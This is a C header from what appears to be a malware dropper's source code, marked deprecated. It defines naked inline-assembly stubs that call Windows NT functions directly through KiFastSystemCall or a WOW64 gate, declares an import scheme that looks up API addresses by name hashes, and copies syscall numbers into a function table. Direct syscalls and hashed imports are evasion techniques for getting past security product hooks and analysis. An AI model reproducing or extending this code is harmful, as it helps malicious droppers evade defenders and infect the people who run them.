#ifndef __DROPPER_NTAPI_H
#define __DROPPER_NTAPI_H

/*
    DEPRECATED
*/

#define NTAPISTUB     \
    DECLSPEC_NAKED    \
    DECLSPEC_NOINLINE \
    NTAPI

#if SCFG_NTAPI_INIT_USE_PROCLOAD == ON
    #define NTAPI_STUB_SOURCE(FUNCTION, ARGSIZE) \
        {                                        \
            __asm { jmp dword ptr FUNCTION };    \
        }
#else
    #define NTAPI_STUB_SOURCE(FUNCTION, ARGSIZE)                            \
        {                                                                   \
            __asm { test byte ptr [Config.NtVersion.bIsDeprecated], TRUE }; \
            __asm { jz L1                                                }; \
            __asm { jmp dword ptr FUNCTION                               }; \
        L1:                                                                 \
            __asm { mov edx, offset KiFastSystemCall                     }; \
            __asm { mov eax, dword ptr FUNCTION                          }; \
            __asm { test byte ptr [Config.Cpu.bUnderWow64], TRUE         }; \
            __asm { cmovnz edx, dword ptr [Config.Os.dwWow64CallOffset]  }; \
            __asm { call edx                                             }; \
            __asm { ret ARGSIZE                                          }; \
        }
#endif

BOOL
DECLSPEC_DEPRECATED
NtapiFindInMemory(VOID);

ULONG
DECLSPEC_DEPRECATED
NtapiImportAddressMethod(
    IN  ULONG  cbFucntionCount,
    OUT PVOID  pAddressExport,
    IN  PDWORD dwProcNamesHash
    );

static
VOID
FORCEINLINE
DECLSPEC_DEPRECATED
NtapiImportSyscallMethod(
    IN  ULONG  cbFucntionCount,
    OUT PVOID  pAddressExport,
    IN  PULONG pSycallOffsets
    )
{
    $DLOG0(DLG_FLT_INFO,    "Importing %lu functions");
    $DLOG1(DLG_FLT_DEFAULT, "pAddressExport = 0x%p", pAddressExport);
    $DLOG1(DLG_FLT_DEFAULT, "pSycallOffsets = 0x%p", pSycallOffsets);

    PRAGMA_LOOP_UNROLL_N(16)
    for (ULONG_PTR i = 0; i != cbFucntionCount; i++) {
        ((PULONG_PTR)pAddressExport)[i] = pSycallOffsets[i];
        $DLOG1(DLG_FLT_DEFAULT, "0x%p = %08lX", &((PULONG_PTR)pAddressExport)[i], pSycallOffsets[i]);
    }

    $DLOG1(DLG_FLT_INFO, "Done!");
}

#endif
